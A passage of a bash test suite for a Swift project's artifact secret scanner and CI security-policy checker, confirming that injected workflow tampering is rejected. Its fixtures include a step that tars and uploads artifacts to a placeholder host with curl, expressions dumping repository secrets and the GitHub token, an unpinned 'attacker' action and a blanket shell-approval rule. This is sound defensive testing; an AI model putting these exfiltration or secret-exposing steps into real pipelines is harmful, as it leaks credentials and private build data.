  grep -q 'oversized PNG: input 1 entry 1' "$log"
  [[ ! -e "$batch_log" ]] || return 1
  rm -rf "$batch_dir" "$batch_log" "$controller_dir" "$fake_scanner" "$privacy_work"

  scanner_tmp="$copy/artifacts/privacy-interrupt-tmp"
  scanner_owner="$copy/artifacts/privacy-interrupt.owner"
  ocr_marker="$copy/artifacts/privacy-interrupt.marker"
  ocr_release="$copy/artifacts/privacy-interrupt.release"
  mkdir -m 700 "$scanner_tmp"
  TMPDIR="$scanner_tmp" \
  SWIFTMAC_OCR_MARKER="$ocr_marker" \
  SWIFTMAC_OCR_RELEASE="$ocr_release" \
    "$copy/scripts/support/start_process_group.py" \
    --owner-file "$scanner_owner" -- \
    /bin/bash -p -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$safe/clean.png" >"$log" 2>&1 &
  privacy_pid=$!
  trap cleanup_privacy_interrupt_test EXIT
  if ! wait_for_process_marker "$scanner_owner" "$privacy_pid" \
    || ! wait_for_process_marker "$ocr_marker" "$privacy_pid"; then
    echo "artifact privacy scan did not reach interruption proof" >&2
    return 1
  fi
  [[ "$(sed -n '1p' "$scanner_owner")" == "$privacy_pid" ]] || return 1
  scanner_dir="$(
    find "$scanner_tmp" -mindepth 1 -maxdepth 1 \
      -type d -name 'swiftmac-visual-secret-scan.*' -print
  )"
  if [[ -z "$scanner_dir" || "$scanner_dir" == *$'\n'* \
    || "$scanner_dir" != "$scanner_tmp"/swiftmac-visual-secret-scan.* ]]; then
    echo "artifact privacy scan did not publish one attributable tool directory" >&2
    find "$scanner_tmp" -mindepth 1 -maxdepth 1 -print >&2
    return 1
  fi
  kill -TERM "-$privacy_pid"
  cleanup_deadline=$((SECONDS + 30))
  live_members=1
  while [[ "$SECONDS" -lt "$cleanup_deadline" ]]; do
    live_members="$(
      /bin/ps -axo pgid=,stat= \
        | /usr/bin/awk -v expected="$privacy_pid" \
          '$1 == expected && $2 !~ /^Z/ { count++ } END { print count + 0 }'
    )"
    if [[ ! -e "$scanner_dir" && "$live_members" -eq 0 ]]; then
      break
    fi
    /bin/sleep 0.05
  done
  [[ "$live_members" -eq 0 ]] \
    || kill -KILL "-$privacy_pid" 2>/dev/null \
    || true
  cleanup_deadline=$((SECONDS + 5))
  while [[ "$live_members" -ne 0 && "$SECONDS" -lt "$cleanup_deadline" ]]; do
    live_members="$(
      /bin/ps -axo pgid=,stat= \
        | /usr/bin/awk -v expected="$privacy_pid" \
          '$1 == expected && $2 !~ /^Z/ { count++ } END { print count + 0 }'
    )"
    [[ "$live_members" -eq 0 ]] || /bin/sleep 0.05
  done
  privacy_status=137
  if [[ "$live_members" -eq 0 ]]; then
    privacy_status=0
    wait "$privacy_pid" || privacy_status=$?
  fi
  [[ "$privacy_status" -ne 0 ]] || return 1
  if [[ -e "$scanner_dir" || "$live_members" -ne 0 ]]; then
    echo "artifact privacy scan did not finish attributable interruption cleanup" >&2
    printf 'tool_dir=%s exists=%s outer_group_members=%s\n' \
      "$scanner_dir" "$([[ -e "$scanner_dir" ]] && echo yes || echo no)" \
      "$live_members" >&2
    return 1
  fi
  rmdir "$scanner_tmp"
  rm -f "$scanner_owner" "$ocr_marker" "$ocr_release"
  privacy_pid=""
  scanner_tmp=""
  trap - EXIT

  OPENAI_API_KEY="$sentinel" \
  GITHUB_WORKSPACE='ordinary visual artifact' \
    bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$safe/clean.png" >/dev/null

  persistent_cache="$copy/.build/tools/visual-secret-scan"
  mkdir -p "$persistent_cache"
  cat >"$persistent_cache/tool-injected" <<'EOF'
#!/bin/bash
/usr/bin/touch "$(dirname "$0")/executed"
exit 0
EOF
  chmod 500 "$persistent_cache/tool-injected"
  shasum -a 256 "$persistent_cache/tool-injected" \
    | awk '{print $1}' >"$persistent_cache/tool-injected.sha256"
  OPENAI_API_KEY="$sentinel" \
    bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$safe/clean.png" >/dev/null
  [[ ! -e "$persistent_cache/executed" ]] || return 1

  set +e
  OPENAI_API_KEY="$sentinel" \
    bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$unsafe/secret.png" >"$log" 2>&1
  scan_status=$?
  set -e
  [[ "$scan_status" -ne 0 ]] || return 1
  grep -q 'pattern:openai-key' "$log"
  ! grep -q 'sk-proj-' "$log" || return 1

  video_fixture_renderer="$copy/.build/render-video-fixture"
  "$copy/scripts/support/run_sanitized.sh" /usr/bin/xcrun swiftc \
    -parse-as-library \
    -swift-version 6 \
    -O \
    -warnings-as-errors \
    -framework AVFoundation \
    -framework CoreGraphics \
    -framework CoreMedia \
    -framework CoreVideo \
    -framework ImageIO \
    "$copy/scripts/support/render_video_fixture.swift" \
    -o "$video_fixture_renderer"
  video_dir="$copy/artifacts/video-scan"
  mkdir -p "$video_dir"
  bash -c \
    '. "$1/scripts/lib.sh"; run_sanitized_with_timeout 30 "$2" "$3" "$4" "$5" "$6" "$7"' \
    _ "$copy" "$video_dir/render-clean.log" "$video_fixture_renderer" \
    clean "$safe/clean.png" "$unsafe/secret.png" "$video_dir/clean.mov" \
    >/dev/null
  clean_video="$(
    bash -c '. "$1/scripts/lib.sh"; scan_video_visual_content "$2" 2160 60' \
      _ "$copy" "$video_dir/clean.mov"
  )"
  [[ "$clean_video" == "3" ]] || return 1

  bash -c \
    '. "$1/scripts/lib.sh"; run_sanitized_with_timeout 30 "$2" "$3" "$4" "$5" "$6" "$7"' \
    _ "$copy" "$video_dir/render-secret.log" "$video_fixture_renderer" \
    secret "$safe/clean.png" "$unsafe/secret.png" "$video_dir/secret.mov" \
    >/dev/null
  secret_video="$video_dir/secret.mov"
  export_dir="$video_dir/secret-export"
  mkdir -m 700 "$export_dir"
  export_count="$(
    bash -c '
      . "$1/scripts/lib.sh"
      export_video_frames_with_timeout "$3" "$4" 2160 60 "$2"
    ' _ "$copy" "$video_dir/export-secret.log" "$secret_video" "$export_dir"
  )"
  [[ "$export_count" == "60" ]] || return 1
  [[ "$(find "$export_dir" -type f -name 'frame-*.png' | wc -l | tr -d ' ')" == "60" ]] || return 1
  rm -rf "$export_dir"
  if bash -c '. "$1/scripts/lib.sh"; scan_video_visual_content "$2" 2160 60' \
    _ "$copy" "$secret_video" >"$log" 2>&1; then
    echo "one-frame video secret bypassed complete visual review" >&2
    return 1
  fi
  grep -q 'input 28: pattern:openai-key' "$log"
  ! grep -q 'sk-proj-' "$log" || return 1
  [[ -z "$(find "$video_dir" -maxdepth 1 -name '.video-secret-scan.*' -print -quit)" ]] || return 1

  before_snapshot_artifacts="$(
    {
      find "$copy/artifacts/preview-exports" -mindepth 1 -maxdepth 1 -print 2>/dev/null || true
      find "$copy/artifacts/preview-review" -mindepth 1 -maxdepth 1 -print 2>/dev/null || true
      find "$copy/artifacts" -maxdepth 1 -type f \
        \( -name 'snapshot-*.log.*' -o -name 'preview-review-*.log.*' \) -print
    } | sort
  )"
  set +e
  OPENAI_API_KEY="$copy" \
    "$copy/scripts/snapshot.sh" Features >"$log" 2>&1
  snapshot_status=$?
  set -e
  [[ "$snapshot_status" -ne 0 ]] || return 1
  after_snapshot_artifacts="$(
    {
      find "$copy/artifacts/preview-exports" -mindepth 1 -maxdepth 1 -print 2>/dev/null || true
      find "$copy/artifacts/preview-review" -mindepth 1 -maxdepth 1 -print 2>/dev/null || true
      find "$copy/artifacts" -maxdepth 1 -type f \
        \( -name 'snapshot-*.log.*' -o -name 'preview-review-*.log.*' \) -print
    } | sort
  )"
  [[ "$before_snapshot_artifacts" == "$after_snapshot_artifacts" ]] || return 1
  grep -q 'Snapshot inputs failed the privacy gate and were discarded.' "$log"
  grep -q '^SNAPSHOT_BASELINES_VERIFIED=false$' "$log"
  ! grep -Fq "$copy" "$log" || return 1

  printf 'not a png\n' >"$unsafe/bogus.png"
  if bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$unsafe/bogus.png" >"$log" 2>&1; then
    echo "artifact secret scan accepted an invalid PNG" >&2
    return 1
  fi
  grep -q 'invalid PNG' "$log"
  rm -f "$unsafe/bogus.png"

  secret_name_path="$unsafe/$sentinel.png"
  cp "$safe/clean.png" "$secret_name_path"
  if OPENAI_API_KEY="$sentinel" \
    bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$secret_name_path" >"$log" 2>&1; then
    echo "artifact secret scan accepted a credential-named valid PNG" >&2
    return 1
  fi
  grep -q 'environment:OPENAI_API_KEY in artifact path' "$log"
  ! grep -Fq "$sentinel" "$log" || return 1
  rm -f "$secret_name_path"

  secret_name_path="$unsafe/$known_token.png"
  cp "$safe/clean.png" "$secret_name_path"
  if env -u OPENAI_API_KEY \
    bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$secret_name_path" >"$log" 2>&1; then
    echo "artifact secret scan accepted a known-pattern credential filename" >&2
    return 1
  fi
  grep -q 'pattern:openai-key in artifact path' "$log"
  ! grep -Fq "$known_token" "$log" || return 1
  rm -f "$secret_name_path"

  path_password="folder/credential-$(uuidgen | tr -d '-')"
  secret_name_path="$unsafe/$path_password/clean.png"
  mkdir -p "$(dirname "$secret_name_path")"
  cp "$safe/clean.png" "$secret_name_path"
  if DATABASE_PASSWORD="$path_password" \
    bash -c '. "$1/scripts/lib.sh"; scan_artifacts "$2"' \
    _ "$copy" "$secret_name_path" >"$log" 2>&1; then
    echo "artifact secret scan accepted a credential spanning path components" >&2
    return 1
  fi
  grep -q 'environment:DATABASE_PASSWORD in artifact path' "$log"
  ! grep -Fq "$path_password" "$log" || return 1
  rm -rf "$unsafe/folder"

  rm -f "$unsafe/trace.bin"
  ln -s "$safe/result.txt" "$unsafe/result-link"
  if "$copy/scripts/support/secret_scan.py" "$unsafe" >"$log" 2>&1; then
    echo "artifact secret scan accepted a symlink" >&2
    return 1
  fi
  grep -q 'symlink entry' "$log"

  rm -f "$unsafe/result-link"
  ln "$safe/result.txt" "$unsafe/result-hardlink"
  if "$copy/scripts/support/secret_scan.py" "$unsafe" >"$log" 2>&1; then
    echo "artifact secret scan accepted a hard link" >&2
    return 1
  fi
  grep -q 'hard-linked entry' "$log"

  rm -rf "$copy/artifacts"
  external="$TMP_ROOT/external-artifacts"
  mkdir "$external"
  chmod 755 "$external"
  ln -s "$external" "$copy/artifacts"
  if bash -c '. "$1/scripts/lib.sh"' _ "$copy" >/dev/null 2>&1; then
    echo "shared helpers accepted a symlinked artifact root" >&2
    return 1
  fi
  [[ "$(stat -f %Lp "$external")" == "755" ]] || return 1

  rm -f "$copy/artifacts"
  mkdir "$copy/artifacts"
  if MOTION_FRAME_WIDTH=360 "$copy/scripts/record-video.sh" 1 unsafe-width >"$log" 2>&1; then
    echo "motion capture accepted frames too small for OCR" >&2
    return 1
  fi
  grep -q 'between 1080 and 2160' "$log"
  if PERF_FRAME_WIDTH=360 "$copy/scripts/perf.sh" unsafe-width 1 'Time Profiler' >"$log" 2>&1; then
    echo "performance capture accepted frames too small for OCR" >&2
    return 1
  fi
  grep -q 'between 1080 and 2160' "$log"

  child_pid="$(
    "$copy/scripts/support/spawn_detached.py" \
      "$copy/scripts/support/run_sanitized.sh" /bin/sleep 5
  )"
  [[ "$child_pid" =~ ^[0-9]+$ ]] || return 1
  bash -c 'kill -0 "$1" && [[ "$(ps -o ppid= -p "$1" | tr -d " ")" == "1" ]]' _ "$child_pid"
  kill -TERM "$child_pid"
}

test_ci_policy_rejects_yaml_bypasses() {
  local build_script codex_config codex_environment codex_rules copy evaluator_workflow factory_package factory_test_script gitignore lockfile mise_config mode_source package_lock workflow
  copy="$(fixture ci-policy)"
  workflow="$copy/.github/workflows/ci.yml"
  evaluator_workflow="$copy/.github/workflows/evaluator-selection.yml"
  lockfile="$copy/mise.lock"
  mise_config="$copy/mise.toml"
  package_lock="$copy/Tools/XcodeBuildMCP/package-lock.json"
  factory_package="$copy/Packages/Factory/Package.swift"
  factory_test_script="$copy/scripts/test.sh"
  gitignore="$copy/.gitignore"
  build_script="$copy/scripts/build.sh"
  codex_config="$copy/.codex/config.toml"
  codex_environment="$copy/.codex/environments/environment.toml"
  codex_rules="$copy/.codex/rules/macos.rules"
  mode_source="$copy/App/RootView.swift"
  cp "$workflow" "$copy/ci-original.yml"
  cp "$evaluator_workflow" "$copy/evaluator-original.yml"
  cp "$lockfile" "$copy/mise-original.lock"
  cp "$mise_config" "$copy/mise-original.toml"
  cp "$package_lock" "$copy/package-lock-original.json"
  cp "$factory_package" "$copy/factory-package-original.swift"
  cp "$factory_test_script" "$copy/factory-test-original.sh"
  cp "$gitignore" "$copy/gitignore-original"
  cp "$build_script" "$copy/build-original.sh"
  cp "$codex_config" "$copy/codex-config-original.toml"
  cp "$codex_environment" "$copy/codex-environment-original.toml"
  cp "$codex_rules" "$copy/codex-rules-original.rules"
  /usr/bin/python3 -I - "$workflow" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
text = path.read_text()
needle = "on:\n  workflow_dispatch:\n"
assert text.count(needle) == 1
path.write_text(text.replace(needle, "on:\n  pull_request:\n", 1))
PY
  expect_ci_rejection \
    "$copy" \
    "ci.yml: hosted verification must be manual workflow_dispatch only"

  cp "$copy/ci-original.yml" "$workflow"
  /usr/bin/python3 -I - "$workflow" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace("    name: verify\n", "    name: verify\n    permissions: write-all\n", 1))
PY
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted inline job write permissions" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  /usr/bin/python3 -I - "$workflow" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace(
    "    steps:\n",
    "    steps:\n      - {uses: attacker/action@main} # zizmor: ignore[unpinned-uses]\n",
    1,
))
PY
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a flow-style ignored mutable action" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  cat >>"$workflow" <<'EOF'
      - name: Upload raw artifacts
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
        with:
          path: artifacts/
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a blanket raw-artifact upload" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  cat >>"$workflow" <<'EOF'
      - name: Exfiltrate raw artifacts
        run: tar -czf - artifacts/ | curl --data-binary @- https://example.invalid/upload
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted an ad hoc artifact transfer" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  cat >>"$workflow" <<'EOF'
      - name: Materialize bracket secret
        env:
          FACTORY_PROBE: ${{ secrets['FACTORY_PROBE'] }}
        run: echo blocked
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted bracket-form repository secret access" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  cat >>"$workflow" <<'EOF'
      - name: Materialize nested contexts
        env:
          FACTORY_SECRETS: ${{ toJSON(secrets) }}
          FACTORY_TOKEN: ${{ github['token'] }}
        run: echo blocked
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted nested secret or bracket token access" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  cat >>"$workflow" <<'EOF'
      - name: Materialize brace-obscured secret
        env:
          FACTORY_PROBE: ${{ format('{0}', secrets['FACTORY_PROBE']) }}
        run: echo blocked
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a brace-obscured repository secret" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  cat >>"$workflow" <<'EOF'
      - name: Materialize whole GitHub context
        env:
          FACTORY_GITHUB: ${{ toJSON(github) }}
        run: echo blocked
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted whole GitHub context materialization" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  cat >>"$workflow" <<'EOF'
      - name: Materialize parenthesized GitHub context
        env:
          FACTORY_GITHUB: ${{ toJSON((github)) }}
        run: echo blocked
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted parenthesized GitHub context materialization" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  cat >>"$workflow" <<'EOF'
      - name: Materialize uppercase GitHub context
        env:
          FACTORY_GITHUB: ${{ toJSON(GITHUB) }}
        run: echo blocked
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted uppercase GitHub context materialization" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  cat >>"$workflow" <<'EOF'
      - name: Hide forbidden expressions behind quoted hashes
        env:
          FACTORY_PROBE: "#${{ secrets.FACTORY_PROBE }}"
        run: echo "#"; curl https://example.invalid/
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted hash-obscured secret or network access" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  /usr/bin/python3 -I - "$workflow" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
text = path.read_text()
needle = "jobs:\n"
assert text.count(needle) == 1
path.write_text(text.replace(
    needle,
    "defaults:\n  run:\n    working-directory: reviewed\n    shell: ./no-op-shell {0}\n\n" + needle,
    1,
))
PY
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted workflow defaults that bypass the preinstall gate" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  mkdir -p "$copy/.github/workflows"
  cat >"$copy/.github/workflows/unreviewed.yml" <<'EOF'
name: Unreviewed
on: pull_request
permissions:
  contents: read
jobs:
  unreviewed:
    runs-on: macos-26
    steps:
      - run: /usr/bin/true
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted an unreviewed additional workflow" >&2
    return 1
  fi
  rm "$copy/.github/workflows/unreviewed.yml"

  /usr/bin/python3 -I - "$evaluator_workflow" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
needle = '          /usr/bin/test "$(/usr/bin/id -u)" != "0"\n'
text = path.read_text()
assert text.count(needle) == 1
path.write_text(text.replace(needle, "", 1))
PY
  expect_ci_rejection \
    "$copy" \
    'missing protected evaluator contract: /usr/bin/test "$(/usr/bin/id -u)" != "0"'
  cp "$copy/evaluator-original.yml" "$evaluator_workflow"

  /usr/bin/python3 -I - "$evaluator_workflow" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
needle = '          /usr/bin/test -z "$(/usr/bin/codesign -d --entitlements - "$binary" 2>/dev/null)"\n'
text = path.read_text()
assert text.count(needle) == 1
path.write_text(text.replace(needle, "", 1))
PY
  expect_ci_rejection \
    "$copy" \
    'missing protected evaluator contract: /usr/bin/test -z'
  cp "$copy/evaluator-original.yml" "$evaluator_workflow"

  /usr/bin/python3 -I - "$evaluator_workflow" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
needle = '          esac\n'
text = path.read_text()
assert text.count(needle) == 2
unguarded = '          "$binary" query evaluate selection "$root/ledger" "$signing_key" "$execution"\n'
path.write_text(text.rsplit(needle, 1)[0] + needle + unguarded + text.rsplit(needle, 1)[1])
PY
  expect_ci_rejection \
    "$copy" \
    "exact reviewed protected evaluator workflow changed"
  cp "$copy/evaluator-original.yml" "$evaluator_workflow"

  cat >"$copy/pathlib.py" <<'PY'
import os
os._exit(0)
PY
  local isolated_output
  isolated_output="$("$copy/scripts/check-ci-security.sh")"
  grep -q '^check-ci-security: OK$' <<<"$isolated_output"
  rm "$copy/pathlib.py"

  cp "$copy/ci-original.yml" "$workflow"
  /usr/bin/python3 -I - "$workflow" <<'PY'
import pathlib
import re
import sys

path = pathlib.Path(sys.argv[1])
text = path.read_text()
pattern = r'(hashlib\.sha256\(checker\.read_bytes\(\)\)\.hexdigest\(\)\s+!= ")[0-9a-f]{64}(")'
assert len(re.findall(pattern, text)) == 1
path.write_text(re.sub(pattern, rf'\g<1>{"0" * 64}\2', text, count=1))
PY
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a changed dependency-checker digest binding" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  /usr/bin/python3 -I - "$workflow" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace(
    '          MISE_NO_HOOKS: "1"\n',
    "",
    1,
))
PY
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a hook-enabled mise action" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  /usr/bin/python3 -I - "$workflow" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
text = path.read_text()
needle = "          mise_dir: ${{ runner.temp }}/swiftmac-mise\n"
assert text.count(needle) == 1
path.write_text(text.replace(needle, "", 1))
PY
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted an inherited mise binary directory" >&2
    return 1
  fi

  cp "$copy/ci-original.yml" "$workflow"
  cat >>"$mise_config" <<'EOF'

[hooks]
preinstall = "echo unsafe-fixture-hook"
EOF
  expect_dependency_rejection \
    "$copy" \
    "mise.toml: reviewed dependency input digest changed"
  cp "$copy/mise-original.toml" "$mise_config"

  printf '[tools]\nnode = "24.16.0"\n' >"$copy/.mise.toml"
  expect_dependency_rejection \
    "$copy" \
    ".mise.toml: unreviewed mise configuration input exists"
  rm "$copy/.mise.toml"

  mkdir -p "$copy/nested/mise"
  printf '[tools]\nnode = "24.16.0"\n' >"$copy/nested/mise/config.toml"
  expect_dependency_rejection \
    "$copy" \
    "nested/mise: unreviewed mise configuration input exists"
  rm -rf "$copy/nested"

  printf 'node 24.16.0\n' >"$copy/.tool-versions"
  expect_dependency_rejection \
    "$copy" \
    ".tool-versions: unreviewed mise configuration input exists"
  rm "$copy/.tool-versions"

  cp "$copy/ci-original.yml" "$workflow"
  /usr/bin/python3 -I - "$lockfile" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace("https://github.com/", "https://example.invalid/", 1))
PY
  expect_dependency_rejection \
    "$copy" \
    "mise.lock: reviewed dependency input digest changed"
  cp "$copy/mise-original.lock" "$lockfile"

  /usr/bin/python3 -I - "$package_lock" <<'PY'
import json
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
data = json.loads(path.read_text())
package = next(
    value for key, value in data["packages"].items()
    if key and key != "node_modules/xcodebuildmcp" and "integrity" in value
)
package["integrity"] = "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
path.write_text(json.dumps(data, indent=2) + "\n")
PY
  expect_dependency_rejection \
    "$copy" \
    "Tools/XcodeBuildMCP/package-lock.json: reviewed dependency input digest changed"
  cp "$copy/package-lock-original.json" "$package_lock"

  printf '\nlet unreviewed = Package.Dependency.package(url: "https://example.invalid/factory.git", from: "1.0.0")\n' >>"$factory_package"
  expect_dependency_rejection \
    "$copy" \
    "Packages/Factory/Package.swift: Factory must remain dependency-free"
  cp "$copy/factory-package-original.swift" "$factory_package"

  printf '{}\n' >"$copy/Packages/Factory/Package.resolved"
  expect_dependency_rejection \
    "$copy" \
    "Packages/Factory/Package.resolved: Factory dependency resolution inputs are forbidden"
  rm "$copy/Packages/Factory/Package.resolved"

  printf '// Unreviewed alternate SwiftPM manifest.\n' \
    >"$copy/Packages/Factory/Package@swift-6.2.swift"
  expect_dependency_rejection \
    "$copy" \
    "Packages/Factory/Package@swift-6.2.swift: alternate SwiftPM manifest is forbidden"
  rm "$copy/Packages/Factory/Package@swift-6.2.swift"

  mkdir -p "$copy/Packages/Factory/.swiftpm"
  printf '{}\n' >"$copy/Packages/Factory/.swiftpm/workspace-state.json"
  expect_dependency_rejection \
    "$copy" \
    "Packages/Factory/.swiftpm: SwiftPM state directories are forbidden"
  rm -rf "$copy/Packages/Factory/.swiftpm"

  mkdir -p "$copy/Packages/Factory/Plugins/UnreviewedPlugin"
  printf '// Unreviewed plugin source.\n' \
    >"$copy/Packages/Factory/Plugins/UnreviewedPlugin/plugin.swift"
  expect_dependency_rejection \
    "$copy" \
    "Packages/Factory/Plugins: SwiftPM Plugins directories are forbidden"
  rm -rf "$copy/Packages/Factory/Plugins"

  printf 'public let unreviewedFactoryController = true\n' \
    >"$copy/Packages/Factory/Sources/FactoryCore/Unreviewed.swift"
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted an unreviewed Factory controller" >&2
    return 1
  fi
  rm "$copy/Packages/Factory/Sources/FactoryCore/Unreviewed.swift"

  /usr/bin/python3 -I - "$factory_test_script" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
text = path.read_text()
needle = "    run_pkg Factory\n"
assert text.count(needle) == 1
path.write_text(text.replace(needle, "", 1))
PY
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted removal of Factory from the host test ladder" >&2
    return 1
  fi
  cp "$copy/factory-test-original.sh" "$factory_test_script"

  rm "$copy/.claude/skills"
  ln -s ../docs/factory "$copy/.claude/skills"
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a retargeted Claude skill-discovery link" >&2
    return 1
  fi
  rm "$copy/.claude/skills"
  ln -s ../.agents/skills "$copy/.claude/skills"

  /usr/bin/python3 -I - "$build_script" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace(
    "run_sanitized /usr/bin/xcodebuild build \\\n",
    "# run_sanitized /usr/bin/xcodebuild build (dead policy marker)\n/usr/bin/xcodebuild build \\\n",
    1,
))
PY
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a dead sanitizer comment beside an unsafe build" >&2
    return 1
  fi
  cp "$copy/build-original.sh" "$build_script"

  cat >>"$build_script" <<'EOF'
if /usr/bin/false; then
  run_sanitized /usr/bin/xcodebuild -version
fi
/usr/bin/xcodebuild -version
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a dead sanitizer branch beside an unsafe build" >&2
    return 1
  fi
  cp "$copy/build-original.sh" "$build_script"

  cat >>"$build_script" <<'EOF'
/usr/bin/xcrun xctrace list templates
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted an unsanitized xctrace invocation" >&2
    return 1
  fi
  cp "$copy/build-original.sh" "$build_script"

  mkdir -p "$copy/scripts/nested"
  cat >"$copy/scripts/nested/bypass.sh" <<'EOF'
#!/usr/bin/env bash
/usr/bin/swift --version
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted an unreviewed nested shell controller" >&2
    return 1
  fi
  rm -rf "$copy/scripts/nested"

  /usr/bin/python3 -I - "$codex_config" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace(
    'command = "./scripts/support/run_sanitized.sh"\nargs = ["/usr/bin/xcrun", "mcpbridge"]',
    'command = "xcrun"\nargs = ["mcpbridge"]',
    1,
))
PY
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted an ambient native Xcode MCP launcher" >&2
    return 1
  fi
  cp "$copy/codex-config-original.toml" "$codex_config"

  cat >>"$codex_config" <<'EOF'

[mcp_servers.unreviewed]
command = "/usr/bin/true"
EOF
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted an additional project MCP server" >&2
    return 1
  fi
  cp "$copy/codex-config-original.toml" "$codex_config"

  /usr/bin/python3 -I - "$codex_environment" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace('script = ""', 'script = "/usr/bin/true"', 1))
PY
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a mutable project setup action" >&2
    return 1
  fi
  cp "$copy/codex-environment-original.toml" "$codex_environment"

  printf '%s\n' 'prefix_rule(pattern=["bash"], decision="allow")' >>"$codex_rules"
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a generic shell approval rule" >&2
    return 1
  fi
  cp "$copy/codex-rules-original.rules" "$codex_rules"

  printf '%s\n' 'unreviewed = true' >"$copy/.codex/unknown.toml"
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted an unreviewed Codex control file" >&2
    return 1
  fi
  rm "$copy/.codex/unknown.toml"

  printf '\nPackages/Features/CLAUDE.local.md\n' >>"$gitignore"
  printf '# Ignored nested Claude instructions.\n' \
    >"$copy/Packages/Features/CLAUDE.local.md"
  "$copy/scripts/check-dependency-inputs.sh" --write .gitignore >/dev/null
  expect_ci_rejection \
    "$copy" \
    "scripts/security-boundary.sha256: controller path set is incomplete or unordered"
  rm "$copy/Packages/Features/CLAUDE.local.md"
  cp "$copy/gitignore-original" "$gitignore"
  "$copy/scripts/check-dependency-inputs.sh" --write .gitignore >/dev/null

  printf '{}\n' >"$copy/.mcp.json"
  expect_ci_rejection \
